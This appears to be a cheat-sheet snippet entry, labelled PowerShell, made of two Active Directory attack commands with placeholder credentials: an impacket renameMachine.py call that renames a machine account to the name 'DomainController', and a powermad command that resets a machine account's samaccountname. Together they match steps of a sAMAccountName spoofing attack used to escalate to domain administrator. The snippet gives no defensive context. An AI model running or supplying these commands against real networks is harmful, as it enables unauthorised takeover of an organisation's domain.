---
id: bf587c30-382f-4e9a-b28d-93006f508135
type: code
language: ps1
verified: false
created_at: '2023-04-06T03:56:03.096915+00:00'
updated_at: '2023-04-10T20:26:11.554516+00:00'
---

# Code Snippet bf587c30

**Language**: ps1

```ps1
impacket@linux> renameMachine.py -current-name 'DomainController' -new-name 'ControlledComputer$' 'domain.local'/'user':'password'

powermad@windows> Set-MachineAccountAttribute -MachineAccount "ControlledComputer" -Value "ControlledComputer" -Attribute samaccountname -Verbose
```
